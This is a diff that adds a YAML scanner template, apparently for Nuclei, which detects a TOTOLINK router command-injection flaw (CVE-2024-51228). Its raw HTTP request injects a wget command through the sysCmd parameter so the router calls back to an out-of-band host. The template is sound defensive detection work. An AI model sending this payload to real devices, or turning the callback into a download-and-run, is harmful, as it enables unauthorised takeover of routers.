@@ -1,0 +1,27 @@
+id: totop-link-formsyscmd-rce
+info:
+  name: TOTOLINK Remote Code Execution Vulnerability (CVE-2024-51228)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,rce,cve-2024-51228
+http:
+  - raw:
+      - |
+        POST /boafrm/formSysCmd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sysCmd=wget+http://{{interactsh-url}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "The document has moved"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
